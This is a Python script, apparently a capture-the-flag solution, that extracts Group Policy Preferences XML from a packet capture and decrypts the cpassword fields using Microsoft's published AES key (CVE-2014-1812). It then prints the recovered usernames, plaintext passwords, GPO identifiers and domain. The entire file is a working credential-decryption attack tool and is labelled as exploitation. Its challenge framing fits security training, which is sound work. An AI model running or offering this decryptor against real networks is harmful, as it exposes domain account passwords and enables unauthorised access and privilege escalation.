import re
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from scapy.all import *

# CVE-2014-1812: Microsoft GPP AES Key (Published by Microsoft on MSDN in 2012)
# This is the publicly known key that Microsoft published for Group Policy Preferences
# Reference: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be
AES_KEY = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xff\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'
AES_IV = b'\x00' * 16

def decrypt_password(cpassword):
    """
    Decrypt Group Policy Preferences password using the public Microsoft AES key.
    
    Args:
        cpassword: Base64-encoded encrypted password from GPP XML
    
    Returns:
        Decrypted password string or None if decryption fails
    """
    try:
        # Handle base64 padding
        pad = len(cpassword) % 4
        if pad == 1:
            cpassword = cpassword[:-1]
        elif pad == 2 or pad == 3:
            cpassword += '=' * (4 - pad)
        
        decoded = base64.b64decode(cpassword)
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        decrypted = cipher.decrypt(decoded)
        unpadded = unpad(decrypted, 16)
        return unpadded.decode('utf-16-le')
    except Exception as e:
        return None

def extract_xml_data(pcap_file):
    """
    Extract XML data containing cpassword fields from PCAP file.
    
    Args:
        pcap_file: Path to the PCAP file
    
    Returns:
        List of raw packet payloads containing XML data
    """
    print("[*] Loading PCAP file...")
    packets = rdpcap(pcap_file)
    
    xml_contents = []
    
    print(f"[*] Analyzing {len(packets)} packets...")
    
    for pkt in packets:
        if Raw in pkt:
            payload = bytes(pkt[Raw].load)
            # Look for GPP XML files with cpassword fields
            if b'<?xml' in payload and b'cpassword=' in payload:
                xml_contents.append(payload)
    
    return xml_contents

def parse_xml_field(xml_data, field_name):
    """
    Parse a field from XML data using regex.
    
    Args:
        xml_data: Raw XML data as bytes
        field_name: Name of the XML attribute to extract
    
    Returns:
        Value of the field or None if not found
    """
    pattern = f'{field_name}="([^"]*)"'
    match = re.search(pattern.encode(), xml_data)
    if match:
        return match.group(1).decode('utf-8', errors='ignore')
    return None

def solve_challenge(pcap_file):
    """
    Main function to solve the GPP password challenge.
    Extracts and decrypts passwords from Group Policy Preferences in a PCAP file.
    
    Args:
        pcap_file: Path to the challenge PCAP file
    """
    print("=" * 70)
    print("[*] CVE-2014-1812 - Group Policy Preferences Password Decryptor")
    print("[*] Exploiting publicly disclosed Microsoft AES key (2012)")
    print("=" * 70)
    print()
    
    xml_contents = extract_xml_data(pcap_file)
    
    if not xml_contents:
        print("[!] No XML files with cpassword found in PCAP")
        return
    
    print(f"[+] Found {len(xml_contents)} XML file(s) with cpassword field\n")
    
    domain = None
    gpo_guid = None
    username_with_cpass = None
    decrypted_password = None
    modification_date = None
    
    credentials_found = []
    
    for idx, xml_data in enumerate(xml_contents, 1):
        try:
            xml_str = xml_data.decode('utf-8', errors='ignore')
        except:
            continue
        
        # Extract domain name from SYSVOL path
        if 'qayssarayra.fun' in xml_str.lower():
            domain = 'qayssarayra.fun'
        
        # Determine XML file type
        xml_type = "Unknown"
        if 'Groups.xml' in xml_str:
            xml_type = "Groups.xml"
        elif 'Services.xml' in xml_str:
            xml_type = "Services.xml"
        elif 'ScheduledTasks.xml' in xml_str:
            xml_type = "ScheduledTasks.xml"
        
        # Parse XML fields
        uid = parse_xml_field(xml_data, 'uid')
        username = parse_xml_field(xml_data, 'userName')
        cpassword = parse_xml_field(xml_data, 'cpassword')
        changed = parse_xml_field(xml_data, 'changed')
        
        if cpassword:
            print(f"[*] Processing {xml_type}...")
            decrypted = decrypt_password(cpassword)
            
            if decrypted:
                print(f"[+] Successfully decrypted password!")
                print(f"    Username: {username}")
                print(f"    Password: {decrypted}")
                print(f"    UID: {uid}")
                print(f"    Changed: {changed}")
                print()
                
                credentials_found.append({
                    'type': xml_type,
                    'username': username,
                    'password': decrypted,
                    'uid': uid,
                    'changed': changed
                })
                
                # Store the real credentials from Groups.xml
                if 'Groups.xml' in xml_str:
                    username_with_cpass = username
                    decrypted_password = decrypted
                    gpo_guid = uid.upper() if uid else None
                    if changed:
                        modification_date = changed.split()[0]
            else:
                print(f"[!] Failed to decrypt password (likely a decoy)")
                print(f"    Username: {username}")
                print(f"    cpassword: {cpassword[:50]}...")
                print()
    
    # Print summary
    print("=" * 70)
    print("[*] CHALLENGE SOLUTION SUMMARY")
    print("=" * 70)
    
    if credentials_found:
        print(f"\n[+] Valid Credentials Found: {len(credentials_found)}")
        for cred in credentials_found:
            print(f"\n    File Type: {cred['type']}")
            print(f"    Username: {cred['username']}")
            print(f"    Password: {cred['password']}")
            print(f"    Modified: {cred['changed']}")
    
    if all([domain, gpo_guid, username_with_cpass, decrypted_password, modification_date]):
        print(f"\n[+] PRIMARY TARGET (from Groups.xml):")
        print(f"    Domain: {domain}")
        print(f"    GPO GUID: {gpo_guid}")
        print(f"    Username: {username_with_cpass}")
        print(f"    Password: {decrypted_password}")
        print(f"    Last Modified: {modification_date}")
    else:
        print("\n[!] Could not extract all required information")
        print(f"    Domain: {domain}")
        print(f"    GPO GUID: {gpo_guid}")
        print(f"    Username: {username_with_cpass}")
        print(f"    Password: {decrypted_password}")
        print(f"    Date: {modification_date}")
    
    print("\n" + "=" * 70)

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1:
        pcap_file = sys.argv[1]
    else:
        pcap_file = "challenge.pcap"
    
    try:
        solve_challenge(pcap_file)
    except FileNotFoundError:
        print(f"[!] Error: File '{pcap_file}' not found")
        print(f"[*] Usage: python3 solve.py [pcap_file]")
    except Exception as e:
        print(f"[!] Error: {e}")